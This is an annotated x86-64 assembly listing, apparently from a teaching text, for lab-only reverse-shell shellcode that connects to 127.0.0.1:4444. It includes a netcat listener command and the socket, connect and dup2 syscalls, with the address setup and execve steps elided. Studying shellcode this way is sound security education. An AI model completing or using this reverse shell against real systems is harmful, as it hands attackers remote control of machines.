/* revshell_x64.S — LAB ONLY. Connects back to 127.0.0.1:4444 and
 * hands over a shell. Build a listener with: nc -lvnp 4444
 * Full source (with the sockaddr struct on the stack) in the repo. */
.intel_syntax noprefix
.global _start
.text
_start:
    /* sockfd = socket(AF_INET=2, SOCK_STREAM=1, 0) */
    push   2
    pop    rdi
    push   1
    pop    rsi
    xor    edx, edx
    push   41
    pop    rax                       /* ❶ __NR_socket */
    syscall
    mov    rdi, rax                   /* ❷ save sockfd in rdi for reuse */

    /* connect(sockfd, &sockaddr, 16) — sockaddr built on the stack */
    /* ... push family+port+addr (127.0.0.1:4444) onto the stack ... */
    mov    rsi, rsp
    push   16
    pop    rdx
    push   42
    pop    rax                       /* ❸ __NR_connect */
    syscall

    /* dup2(sockfd, 0..2): wire stdin/stdout/stderr to the socket */
    push   3
    pop    rsi                        /* ❹ loop counter: 3,2,1,0 */
.dup_loop:
    dec    rsi
    push   33
    pop    rax                        /* ❺ __NR_dup2 */
    syscall                           /* dup2(rdi=sockfd, rsi) */
    jne    .dup_loop                   /* rsi hits 0 -> stdin done, stop */

    /* execve("/bin/sh", NULL, NULL) — as in Listing earlier */
    /* ... */
